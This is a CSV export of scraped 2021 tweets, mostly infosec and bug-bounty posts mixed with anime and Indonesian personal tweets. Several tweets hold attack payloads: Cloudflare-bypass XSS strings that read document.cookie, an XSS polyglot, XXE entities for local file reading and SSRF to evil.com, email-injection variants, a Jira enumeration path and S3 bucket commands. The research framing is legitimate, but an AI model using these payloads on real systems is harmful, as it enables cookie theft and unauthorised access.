Name,Handle,Timestamp,Verified,Content,Comments,Retweets,Likes,Analytics,Tags,Mentions,Emojis,Profile Image,Tweet Link,Tweet ID
Muhammad Daffa,@daffainfo,2021-07-27T11:27:13.000Z,False,Sedih :'( https://x.com/UnderTheBreach/UnderTheBreach/status/1419901799105024006…,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1419982706608279557,tweet_id:1419982706608279557
Shivam Kumar Singh,@MrRajputHacker,2021-07-26T04:10:42.000Z,False,"JQUERY XSS EXAMPLES

Link :- https://public.cyber.mil/test-page/Credit  #todaycybernews#bugbountytips #cybersecurity #bugbountytip #XSS #infosec",0,44,62,0,"['#todaycybernews', '#bugbountytips', '#cybersecurity', '#bugbountytip', '#XSS', '#infosec']",['@jonathandata1'],[],https://pbs.twimg.com/profile_images/1779202152688390144/msMLFGy__normal.jpg,https://twitter.com/MrRajputHacker/status/1419510462937325572,tweet_id:1419510462937325572
Sam Curry,@samwcyo,2021-07-25T13:46:19.000Z,True,"Found a really interesting reverse proxy vulnerability where the frontend authorization check parsed/validated the integer from the string (123/\?& == 123) then passed the whole argument to the internal API. You could access other people's data via id=YOUR_ID/../VICTIM_ID, and...",11,183,708,0,[],[],[],https://pbs.twimg.com/profile_images/1160713388940496896/fWNLI3aU_normal.jpg,https://twitter.com/samwcyo/status/1419292936303353861,tweet_id:1419292936303353861
Anime Senpai,@senpaisauces,2021-07-24T15:17:09.000Z,False,Haikyuu!! theme song played during Olympics!,158,"6,552",1.5万,0,[],[],[],https://pbs.twimg.com/profile_images/1396186615408697350/OZzhvvE8_normal.jpg,https://twitter.com/senpaisauces/status/1418953404026589190,tweet_id:1418953404026589190
Demon,@R29k_,2021-07-22T09:13:33.000Z,False,https://r29k.com/articles/bb/self-xss-to-stored-xss…#BugBounty,0,13,41,0,['#BugBounty'],[],[],https://pbs.twimg.com/profile_images/1746498489411153920/RNFyfd3B_normal.jpg,https://twitter.com/R29k_/status/1418137125493612544,tweet_id:1418137125493612544
Ismayil Tahmazov,@Tismayil1,2021-07-21T21:50:10.000Z,False,"CloudFlare WAF ByPass

HaHaHa Nice :)

Attack: XSS

Payload: test"",prompt%0A/*HelloWorld*/(document.domain)

Example: https://jsfiddle.net/tismayil/06391Lxs/1/…",3,89,236,0,"['', '', '', '']",[],[],https://pbs.twimg.com/profile_images/1189298042312298496/tpxWbe_B_normal.jpg,https://twitter.com/Tismayil1/status/1417965150066388997,tweet_id:1417965150066388997
Dhiyaneshwaran,@DhiyaneshDK,2021-07-20T18:17:38.000Z,False,Request + Response +  Matcher = Nuclei Template  Detailed blog about writing your Own Nuclei Template! https://dhiyaneshgeek.github.io/web/security/2021/07/19/hack-with-automation/… #nuclei #bugbountytips #hackwithautomation #bugbounty ,2,85,161,0,"['#nuclei', '#bugbountytips', '#hackwithautomation', '#bugbounty']",['@pdiscoveryio'],['\\u2665\\ufe0f'],https://pbs.twimg.com/profile_images/1598014580332322816/Ko8fyOZv_normal.jpg,https://twitter.com/DhiyaneshDK/status/1417549272942137345,tweet_id:1417549272942137345
Muhammad Daffa,@daffainfo,2021-07-20T09:37:21.000Z,False,Go scripts for checking API key/access token validityhttps://github.com/daffainfo/Key-Checker…#bugbounty #bugbountytips #infosec #pentest,10,299,632,0,"['#bugbounty', '#bugbountytips', '#infosec', '#pentest']",[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1417418343024263168,tweet_id:1417418343024263168
Muhammad Daffa,@daffainfo,2021-07-19T20:36:19.000Z,False,Contributed 64 templates last week ,0,0,1,0,[],[],"['\\U0001f525', '\\U0001f525', '\\U0001f525']",https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1417221787994099718,tweet_id:1417221787994099718
Muhammad Daffa,@daffainfo,2021-07-18T09:33:06.000Z,False,"After 1 day of full learning about Go, this is my first program!https://github.com/daffainfo/bypass-403…Go script for bypassing 403 forbidden#bugbountytips #bugbounty",1,24,69,0,"['#bugbountytips', '#bugbounty']",[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1416692494603939845,tweet_id:1416692494603939845
Muhammad Daffa,@daffainfo,2021-07-17T05:04:19.000Z,True,??????,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1416262464786690051,tweet_id:1416262464786690051
Praveen Kanniah,@praveenkanniah,2021-07-16T12:16:51.000Z,False,"#cybersecurity #applicationsecurity #informationsecurityHTTP Request Smuggling made simple. 
Click Link below:https://praveen-kanniah.medium.com/http-request-smuggling-part-1-concepts-b89bfe17b210…",0,34,61,0,"['#cybersecurity', '#applicationsecurity', '#informationsecurity']",[],[],https://pbs.twimg.com/profile_images/1155892788224860160/76059Xsy_normal.jpg,https://twitter.com/praveenkanniah/status/1416008927687282688,tweet_id:1416008927687282688
Jasminder Pal Singh,@Singh_Jasminder,2021-07-15T07:06:07.000Z,False,Stored XSS in Google Doubleclick Studio [Google Research Grant]https://jasminderpalsingh.info/stored-xss-in-google-doubleclick-studio-google-research-grant/…,4,22,72,0,[],[],[],https://pbs.twimg.com/profile_images/1763541369165844480/JJ4K8Vuw_normal.jpg,https://twitter.com/Singh_Jasminder/status/1415568343721861122,tweet_id:1415568343721861122
Muhammad Daffa,@daffainfo,2021-07-15T13:19:32.000Z,False,https://github.com/daffainfo/my-nuclei-templates…Some nuclei templates that I contribute to  !#nuclei #projectdicovery,0,20,46,0,"['#nuclei', '#projectdicovery']","['@pdnuclei', '@pdiscoveryio']",[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1415662315278508039,tweet_id:1415662315278508039
nuclei,@pdnuclei,2021-07-12T15:01:52.000Z,False,"Nuclei v2.4.0 - [RELEASE-UPDATE] Automatic template download / update Author based template execution Workflows to support filters/tags

Release Changelog - https://github.com/projectdiscovery/nuclei/releases/tag/v2.4.0…Release Blog - https://blog.projectdiscovery.io/nuclei-v2-4-0-release/…#hackwithautomation #opensource #cybersecurity",1,50,141,0,"['#hackwithautomation', '#opensource', '#cybersecurity']",[],"['\\U0001f3af', '\\U0001f973', '\\U0001f389']",https://pbs.twimg.com/profile_images/1678872858431201282/rWgndGa1_normal.png,https://twitter.com/pdnuclei/status/1414600906843181060,tweet_id:1414600906843181060
The Hacker News,@TheHackersNews,2021-07-12T06:43:39.000Z,True,"Damn Vulnerable Bank

Intentionally vulnerable application to learn, understand and practice #Android application security.https://rewanthtammana.com/damn-vulnerable-bank/index.html…via ",4,122,280,0,['#Android'],['@rewanthtammana'],[],https://pbs.twimg.com/profile_images/1597647879811657728/FLgHrLHy_normal.jpg,https://twitter.com/TheHackersNews/status/1414475525100228609,tweet_id:1414475525100228609
Muhammad Daffa,@daffainfo,2021-07-11T11:17:10.000Z,False,"7 templates merged, 10+++ templates more to go!! thank you ",1,1,8,0,[],['@pdnuclei'],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1414181971811475457,tweet_id:1414181971811475457
Inon Shkedy,@InonShkedy,2021-07-10T14:16:43.000Z,False,"-Tip 10/31- #bugbountytips 
Found XXE? Leverage it for:
* DoS: XML Bomb
* LFI: <!ENTITY xxe SYSTEM ""file://path"">
** Try 2 slashes (Windows) and 3 (Linux) in path
* SSRF: <!ENTITY xxe SYSTEM ""http://evil.com"">
** Try different protocols [ssh,ftp,etc]",2,28,82,0,['#bugbountytips'],[],[],https://pbs.twimg.com/profile_images/1664020008479911936/rMJ74O7Y_normal.jpg,https://twitter.com/InonShkedy/status/1413864765701730308,tweet_id:1413864765701730308
/r/netsec,@_r_netsec,2021-07-06T17:43:06.000Z,False,Less.js Exploit to RCE https://softwaresecured.com/exploiting-less-js/…,0,26,68,0,[],[],[],https://pbs.twimg.com/profile_images/990624384636219393/PpOkRWSi_normal.jpg,https://twitter.com/_r_netsec/status/1412467153823952896,tweet_id:1412467153823952896
ISACA Indonesia,@ISACA_ID,2021-07-06T12:44:04.000Z,False,"Keluarga Besar ISACA Indonesia turut berbela sungkawa atas wafatnya Ketua National Cyber Security Defence (NCDS) Bapak Iwan Sumantri.

Semoga Husnul Khotimah dan diterima seluruh amal Ibadahnya. 

Serta Keluarga dan kerabat yang ditinggalkan diberi ketabahan dan Kesehatan.",0,15,8,0,[],[],[],https://pbs.twimg.com/profile_images/1277458265538846720/NOmzHGNo_normal.jpg,https://twitter.com/ISACA_ID/status/1412391898015174661,tweet_id:1412391898015174661
【公式】ソードアート・オンライン インテグラル・ファクター（SAOIF）,@saoif_gameinfo,2021-07-03T06:01:00.000Z,True,※画面は開発中のものです,15,232,"1,010",0,[],[],[],https://pbs.twimg.com/profile_images/1761569377873510400/Z6RyEF6q_normal.jpg,https://twitter.com/saoif_gameinfo/status/1411203299974410245,tweet_id:1411203299974410245
Harsh Bothra,@harshbothra_,2021-06-30T03:44:00.000Z,True,"#Learn365 Day - 181: Pen-Testing Salesforce SAAS Application

Blog:",1,31,123,0,['#Learn365'],[],[],https://pbs.twimg.com/profile_images/1609428924475543552/SsbPLnxc_normal.jpg,https://twitter.com/harshbothra_/status/1410081659148460033,tweet_id:1410081659148460033
~YK,@N3T_hunt3r,2021-06-28T18:34:45.000Z,False,"CLOUD PENTESTING  CHECKLIST  for AWS, AZURE, GCPhttps://pentestbook.six2dez.com/enumeration/cloud…#infosec #Security #cloud #PenTest",1,148,286,0,"['#infosec', '#Security', '#cloud', '#PenTest']",[],"['\\U0001f31f', '\\U0001f31f']",https://pbs.twimg.com/profile_images/1429854621372063754/l_bn1Md4_normal.jpg,https://twitter.com/N3T_hunt3r/status/1409581047356923931,tweet_id:1409581047356923931
【公式】SAOアンリーシュ・ブレイディング,@saoab_gameinfo,2021-06-28T13:00:01.000Z,True,"【新オリジナルアニメ】本日配信！
原作《ムーンクレイドル編》のオリジナルアニメ第1弾を本日SAOアリブレにて配信いたしました。

制作は、SAOテレビアニメシリーズを手掛けるA-1 Pictures様！
是非アプリ内にてご視聴ください！
冒頭を少しだけお届け！#アリブレ #SAOAB #SAO",78,"3,124","8,752",0,"['#アリブレ', '#SAOAB', '#SAO']",[],[],https://pbs.twimg.com/profile_images/1454330141765943296/X2yvPP2S_normal.jpg,https://twitter.com/saoab_gameinfo/status/1409496809572114433,tweet_id:1409496809572114433
Tushar Verma,@e11i0t_4lders0n,2021-06-27T03:37:33.000Z,False,Infrastructure Pentesting https://bitvijays.github.io/LFF-IPS-P1-IntelligenceGathering.html…https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html…https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html…https://bitvijays.github.io/LFF-IPS-P4-PostExploitation.html…,0,156,297,0,[],[],[],https://pbs.twimg.com/profile_images/1719561788008665088/MZJXPqt6_normal.jpg,https://twitter.com/e11i0t_4lders0n/status/1408992872808914950,tweet_id:1408992872808914950
Brute Logic,@BRuteLogic,2021-06-25T13:48:46.000Z,False,"JavaScript://%250Aalert?.(1)//
'/*\'/*""/*\""/*`/*\`/*%26apos;)/*<!-->
</Title/</Style/</Script/</textArea/</iFrame/</noScript>
\74k<K/contentEditable/autoFocus/OnFocus=
/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76--> #XSS https://brutelogic.com.br/blog/building-xss-polyglots/… by  ",0,70,148,0,['#XSS'],"['@rodoassis', '@brutelogic']",[],https://pbs.twimg.com/profile_images/1716621568976044032/Xoh_YaaJ_normal.jpg,https://twitter.com/BRuteLogic/status/1408421914549358593,tweet_id:1408421914549358593
AMol NAik,@amolnaik4,2021-06-25T06:08:07.000Z,False,"I'm hiring for following roles:

- Cloud Security & SecOps
- Enterprise Security
- Product Security
- Cyber Security & Data Privacy

If you want to solve security challenges across multiple domains for high growth startup, let's connecthttps://linkedin.com/posts/amolnaik4_infosec-hiring-cybersecurity-activity-6814056931565666304-58rb…",8,61,121,0,[],[],[],https://pbs.twimg.com/profile_images/1369894009380896768/5lvX0EVJ_normal.jpg,https://twitter.com/amolnaik4/status/1408305990852759553,tweet_id:1408305990852759553
Inti De Ceukelaire,@securinti,2021-06-24T21:38:04.000Z,False,"Yes, try stuff like 
jhaddix+(.com).com

“jhaddix@gmail.com”.com

“<jhaddix@gmail.com>”.com

“jhaddix@gmail.com;”.com

“jhaddix@gmail.com+”.com

Sometimes you can also put new lines in the local part “ or ()  and then inject SMTP.",4,150,395,0,[],"['@gmail', '@company', '@company', '@company', '@company', '@company']",[],https://pbs.twimg.com/profile_images/1533762548813770758/1-rqzeBw_normal.jpg,https://twitter.com/securinti/status/1408177629199540225,tweet_id:1408177629199540225
Muhammad Daffa,@daffainfo,2021-06-24T23:00:55.000Z,False,"Nice tips, added to my repository!",0,0,2,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1408198481777348609,tweet_id:1408198481777348609
Muhammad Daffa,@daffainfo,2021-06-24T22:59:15.000Z,False,"ux sama kayak windows sebelumnya, ui gabungan linux sama mac os. apakah lebih berat? hehe https://x.com/Windows/status/Windows/status/1408107725096169487…",0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1408198062661537792,tweet_id:1408198062661537792
Kampus Update,@KampusUpdate,2021-06-24T09:36:34.000Z,True,"Masih jadi mahasiswa tapi pengen punya penghasilan sendiri? 

Ada banyak cara yang bisa kamu lakukan, lho!",1,1,23,0,[],[],[],https://pbs.twimg.com/profile_images/870323804236468225/PFBRU3cV_normal.jpg,https://twitter.com/KampusUpdate/status/1407996059138236426,tweet_id:1407996059138236426
Muhammad Daffa,@daffainfo,2021-06-24T08:25:35.000Z,True,"Sip, nunggu jumat, moga aja ga ampas gachanya",0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1407978196599988224,tweet_id:1407978196599988224
Dexter,@s70nyD3x,2021-06-21T15:27:18.000Z,False,"New CloudFlare XSS bypass 

< svg on onload = ( alert ) ( document.domain ) > 

r "" on onmouseover = ( alert ) ( document.domain ) // 

r * / eval ?. ( value % 2B / ( / . source ) // "" > < input value = confirm autofocus onfocus = ' / * ""#bugbounty  #bugbountytips  #xss",1,129,335,0,"['#bugbounty', '#bugbountytips', '#xss']",[],[],https://pbs.twimg.com/profile_images/1279425641868259334/qksD7bIx_normal.jpg,https://twitter.com/s70nyD3x/status/1406997161875673090,tweet_id:1406997161875673090
Muhammad Daffa,@daffainfo,2021-06-22T09:17:48.000Z,True,Wadaw floor 55,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1407266560083853314,tweet_id:1407266560083853314
Aseem Shrey,@AseemShrey,2021-06-17T04:11:45.000Z,True,5. Finding & Exploiting Insecure URL issues,1,6,13,0,[],[],[],https://pbs.twimg.com/profile_images/1440190221950226433/28E0No7p_normal.jpg,https://twitter.com/AseemShrey/status/1405377599589679104,tweet_id:1405377599589679104
Tom Warren,@tomwarren,2021-06-15T16:50:46.000Z,True,"here's a first look at Windows 11. There's a new Start menu, rounded corners, a new startup sound, and more https://theverge.com/2021/6/15/22535123/microsoft-windows-11-leak-screenshots-start-menu…","2,196",1.2万,2.4万,0,[],[],[],https://pbs.twimg.com/profile_images/1601147760673267712/pGbRSFcP_normal.jpg,https://twitter.com/tomwarren/status/1404843837726547971,tweet_id:1404843837726547971
CyCatz,@CyCatz_Official,2021-06-11T04:51:44.000Z,False,"#bugbountytips #bugbounty #jira  Atlassian Jira Unauth User Enumeration (CVE-2020-36289) 

 Jira < 8.5.13
 8.6.0 ≤ Jira < 8.13.5
 8.14.0 ≤ Jira < 8.15.1

PoC: /secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin#cycatz #cybersecurity #cyber #data #Hackers",4,64,134,0,"['#bugbountytips', '#bugbounty', '#jira', '#cycatz', '#cybersecurity', '#cyber', '#data', '#Hackers']",[],[],https://pbs.twimg.com/profile_images/1620656691976216577/YXy4iEHJ_normal.jpg,https://twitter.com/CyCatz_Official/status/1403213336800497666,tweet_id:1403213336800497666
Tushar Verma,@e11i0t_4lders0n,2021-06-11T21:59:41.000Z,False,Cloud Security Resources https://blackhillsinfosec.com/breaching-the-cloud-perimeter-w-beau-bullock/…https://hackingthe.cloudhttps://rishabhsoft.com/blog/cloud-application-security-best-practices…https://d36cz9buwru1tt.cloudfront.net/AWS-Auditing-Whitepaper.pdf…,1,110,262,0,[],[],[],https://pbs.twimg.com/profile_images/1719561788008665088/MZJXPqt6_normal.jpg,https://twitter.com/e11i0t_4lders0n/status/1403472028946948096,tweet_id:1403472028946948096
txtdariprogrammer,@txtdrprogramer,2021-06-11T08:56:56.000Z,False,QA pas lagi sambat :,18,103,249,0,[],[],[],https://pbs.twimg.com/profile_images/1282192035747782657/4K8O8lw7_normal.jpg,https://twitter.com/txtdrprogramer/status/1403275041609949187,tweet_id:1403275041609949187
SheSecures,@she_secures,2021-06-07T12:52:22.000Z,False,"Happy Monday Folks.

We stumbled on some Cybersecurity interview gems thread started by  and we thought to put these together whilst adding a few tips from our pockets.

Got more? Drop them below Hope the rest of the week is kind and gracious to you ",1,21,22,0,[],['@cyberkatelyn'],"['\\U0001f447\\U0001f3ff', '\\U0001f499', '\\U0001f49c', '\\U0001f49a', '\\U0001f49b']",https://pbs.twimg.com/profile_images/897097306859864065/tRDmOd23_normal.jpg,https://twitter.com/she_secures/status/1401884742027517956,tweet_id:1401884742027517956
Sachin Thakuri,@sachinnthakuri,2021-06-07T16:06:22.000Z,False,"Content Discovery -> Source Code Review -> RCE
Sharing a RCE bug report that I found a year back on a program in ",4,67,320,0,[],['@Hacker0x01'],[],https://pbs.twimg.com/profile_images/1728800728976678912/-Kni9m0Z_normal.jpg,https://twitter.com/sachinnthakuri/status/1401933562505355264,tweet_id:1401933562505355264
Muhammad Daffa,@daffainfo,2021-06-06T14:05:35.000Z,False,Hmm,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1401540777990254599,tweet_id:1401540777990254599
The Hacker News,@TheHackersNews,2021-06-05T14:02:47.000Z,True,"[New]  #GitHub has updated its platform policy to remove exploit code when used as ""malware CDN"" in active cyberattacks. 

Read details: https://thehackernews.com/2021/06/github-updates-policy-to-remove-exploit.html…#infosec #cybersecurity #malware #hacking",2,102,160,0,"['#GitHub', '#infosec', '#cybersecurity', '#malware', '#hacking']",[],['\\U0001f525'],https://pbs.twimg.com/profile_images/1597647879811657728/FLgHrLHy_normal.jpg,https://twitter.com/TheHackersNews/status/1401177686001610758,tweet_id:1401177686001610758
Yahya F. Al Fatih,@BukanYahya,2021-06-02T04:00:00.000Z,False,"pernah dapet ""vulnerability bug report"" di email dari orang asing atau bug hunter ? terkadang kita bingung yg mereka bagikan itu valid dan apakah benar mempunyai resiko di bisnis atau teknikal ? aku bikin video tentang ini tentang fair score system",1,2,5,0,[],[],[],https://pbs.twimg.com/profile_images/1727337732530376705/yXGa3lYy_normal.jpg,https://twitter.com/BukanYahya/status/1399938827901292545,tweet_id:1399938827901292545
Axel Rauschmayer (INACTIVE),@rauschma,2021-05-29T15:53:31.000Z,False,"[■,■,■,■].map(■→●) ⇒ [●,●,●,●]
[■,●,■,▲].filter(■→true) ⇒ [■,■]
[■,●,■,▲].find(●→true) ⇒ ●
[■,●,■,▲].findIndex(●→true) ⇒ 1
[■,●,■,▲].fill(●) ⇒ [●,●,●,●]
[■,●,■,▲].some(●→true) ⇒ true
[■,●,■,▲].every(●→true) ⇒ false",56,"2,616",1.3万,0,[],[],[],https://pbs.twimg.com/profile_images/467581434434453504/iFzELOBn_normal.jpeg,https://twitter.com/rauschma/status/1398668839177568259,tweet_id:1398668839177568259
Muhammad Daffa,@daffainfo,2021-05-27T02:44:13.000Z,False,buset,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1397745426099425287,tweet_id:1397745426099425287
Schematics ITS Surabaya,@schematics_its,2021-05-25T09:47:58.000Z,False," NOSTALGIA BERSAMA SCHEMATICS Nyala api Schematics, membawa kehangatan yang abadi. 

Cahayanya bagai lentera yang menerangi lika-liku perjalanan.

Inilah sepenggal kisah kehangatan Schematics yang telah terukir #EnkindletheSpirit#Schematics2021",11,13,34,0,"['#EnkindletheSpirit', '#Schematics2021', '']",[],"['\\u26ab\\ufe0f', '\\u26ab\\ufe0f', '\\U0001f306']",https://pbs.twimg.com/profile_images/1763751154952056832/2F83zOfV_normal.jpg,https://twitter.com/schematics_its/status/1397127291830882306,tweet_id:1397127291830882306
Sword Art Online,@SwordArtUSA,2021-05-23T14:01:10.000Z,False,Happy birthday to the wonderful Yuuki! ,66,625,"3,865",0,[],[],"['\\U0001f970', '\\U0001f973']",https://pbs.twimg.com/profile_images/1760952937998938112/L4aENnHN_normal.jpg,https://twitter.com/SwordArtUSA/status/1396466236545028098,tweet_id:1396466236545028098
Muhammad Daffa,@daffainfo,2021-05-22T10:37:41.000Z,False,What??? bukan itu solusi yang tepat :'(,1,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1396052638454620163,tweet_id:1396052638454620163
Muhammad Daffa,@daffainfo,2021-05-20T13:04:36.000Z,False,"Dan si kotz ini mengaku punya 20 juta foto e-ktp di comment post ini

damn... https://x.com/ndagels/status/ndagels/status/1395205718911819778…",1,0,1,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1395364837698392066,tweet_id:1395364837698392066
Faizal Abroni,@faizalabroni,2021-05-18T15:21:47.000Z,True,"Bypass Cloudflare XSS payload

""><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;#bugbountytips #bugbounty #infosec",3,134,415,0,"['#bugbountytips', '#bugbounty', '#infosec']",[],[],https://pbs.twimg.com/profile_images/571867252015812608/f7Vl7J5-_normal.jpeg,https://twitter.com/faizalabroni/status/1394674586902437896,tweet_id:1394674586902437896
Faizal Abroni,@faizalabroni,2021-05-18T15:06:46.000Z,True,"""Onx=() AutOfOcUs OnfOCuS=prompt(document.cookie)>

Bypass Cloudflare payload #bugbountytips #infosec #bugbounty",5,143,407,0,"['#bugbountytips', '#infosec', '#bugbounty']",[],[],https://pbs.twimg.com/profile_images/571867252015812608/f7Vl7J5-_normal.jpeg,https://twitter.com/faizalabroni/status/1394670807729590274,tweet_id:1394670807729590274
KNOXSS,@KN0X55,2021-05-17T14:22:14.000Z,False,"*** 1st #KNOXSS GIVEAWAY! ***

Like and RT this to have a chance to win one of the following:

* 1 KNOXSS Pro Subscription 3-month
* 1 KNOXSS Pro Subscription 6-month
* 1 KNOXSS Pro Subscription 1-year

Winners of this draw will be announced in 72hs, good luck! ",171,760,"1,048",0,['#KNOXSS'],[],['\\U0001f600'],https://pbs.twimg.com/profile_images/1755679071734837248/F5d2Zuoy_normal.jpg,https://twitter.com/KN0X55/status/1394297211270451202,tweet_id:1394297211270451202
アニメ『ゆるキャン△』シリーズ公式,@yurucamp_anime,2021-05-18T03:00:00.000Z,True,"／
縦型サムネ表示記念
ビジュアル振り返り⑯
＼
『ゆるキャン△ SEASON２』イメージビジュアル第四弾初詣に行った時の鳥羽先生とあかり初日の出もうすぐ見えそうな一枚です#ゆるキャン",2,694,"4,944",0,['#ゆるキャン'],[],"['\\u2728', '\\U0001f4f7', '\\u2600']",https://pbs.twimg.com/profile_images/1775900400451018752/dNIWS1BO_normal.jpg,https://twitter.com/yurucamp_anime/status/1394487910729064449,tweet_id:1394487910729064449
probatorem.eth,@0xProbatorem,2021-05-17T08:25:00.000Z,False,"Found an S3 Bucket? Try these commands:

aws s3api get-bucket-acl --bucket [BucketName]
aws s3 ls s3://[BucketName]
aws s3 mv test.txt s3://[BucketName]
aws s3 cp test.txt s3://[BucketName]
aws s3 rm s3://[BucketName]#bugbounty #bugbountytips #hackerone #infosec #hacking #aws",8,104,242,0,"['#bugbounty', '#bugbountytips', '#hackerone', '#infosec', '#hacking', '#aws']",[],[],https://pbs.twimg.com/profile_images/1571665093468766211/mrwCbQyD_normal.jpg,https://twitter.com/0xProbatorem/status/1394207308280905728,tweet_id:1394207308280905728
/r/netsec,@_r_netsec,2021-05-17T20:13:07.000Z,False,Password reset poisoning in Drupal,1,36,82,0,[],[],[],https://pbs.twimg.com/profile_images/990624384636219393/PpOkRWSi_normal.jpg,https://twitter.com/_r_netsec/status/1394385512140468224,tweet_id:1394385512140468224
Binni Shah,@binitamshah,2021-05-16T14:53:02.000Z,True,Identify a Facebook user by his phone number despite privacy settings set  - Tale of $9K bug bounty : https://ysamm.com/?p=691 credits ,4,103,321,0,[],['@Samm0uda'],[],https://pbs.twimg.com/profile_images/1398405141405978631/4JhsrzJZ_normal.jpg,https://twitter.com/binitamshah/status/1393942574579163143,tweet_id:1393942574579163143
Angga Fauzan ,@angga_fzn,2021-05-16T08:15:16.000Z,False,"Lagi proses seleksi kerja/beasiswa? Suka bingung sama pertanyaan ini?

1. Sebelumnya kamu ngapain aja?
2. Apa prestasi/pencapaian kamu?
3. Kelemahan kamu apa?

Coba pakai STAR framework. 

Ini ngebantu bikin kalimat yang rapi ala 'storytelling' & mudah dipahami.

sebuah utas ~",48,"7,312",3.2万,0,[],[],[],https://pbs.twimg.com/profile_images/1547037838629212162/qM0y7n3m_normal.jpg,https://twitter.com/angga_fzn/status/1393842470899748867,tweet_id:1393842470899748867
Aditya Shende,@ADITYASHENDE17,2021-05-16T07:13:10.000Z,True,"Aardvark acquired by Google

ITA Software acquired by Google

Workbench Platform acquired by Google

FameBit acquired by Google

Plink Search acquired by Google

Sparkbuy acquired by Google

DNNresearch acquired by Google

Meebo acquired by Google",6,55,145,0,[''],[],[],https://pbs.twimg.com/profile_images/1776992369071489024/58m6o_p4_normal.jpg,https://twitter.com/ADITYASHENDE17/status/1393826844101677057,tweet_id:1393826844101677057
Muhammad Daffa,@daffainfo,2021-05-15T22:25:43.000Z,False,https://github.com/daffainfo/AllAboutBugBounty…My repository about bug bounty reached 1000+ stars and 195 forks!! Soon update!#bugbountytips #bugbountytip #bugbounty #infosec,0,1,5,0,"['#bugbountytips', '#bugbountytip', '#bugbounty', '#infosec']",[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1393694105641787395,tweet_id:1393694105641787395
Muhammad Daffa,@daffainfo,2021-05-14T23:20:00.000Z,False,Thank you for sharing it again  ,0,0,0,0,[],['@Alra3ees'],['\\U0001f609'],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1393345379588984838,tweet_id:1393345379588984838
hakluke,@hakluke,2021-05-05T03:16:36.000Z,True,"Huge announcement:

I quit my job at Bugcrowd!

Read the blog / watch the video to find out why, and what I'm doing next.",97,60,602,0,[],[],[],https://pbs.twimg.com/profile_images/1701575344644665344/QPxdwFia_normal.jpg,https://twitter.com/hakluke/status/1389781042555363329,tweet_id:1389781042555363329
